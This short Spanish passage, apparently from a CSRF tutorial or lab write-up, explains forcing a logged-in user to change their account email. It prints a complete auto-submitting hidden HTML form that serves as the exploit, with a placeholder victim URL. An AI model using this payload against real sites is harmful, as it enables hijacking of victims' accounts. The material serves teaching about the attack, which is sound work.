En este caso efectuar el ataque es bastante simple, para efectuar ataques CSRF necesitamos de una pagina web bajo nuestro control, en la cual vamos a hacer que el usuario envié una petición POST para cambiar el email a la pagina en la que está loggeado,  el exploit que usaríamos para este caso seria el siguiente:

```html
<form method="POST" action="{URL_PAGINA_VICTIMA}">
	<input type="hidden" name="email" value="newemail@new.com">
</form>
<script>
	document.forms[0].submit()
</script>
```

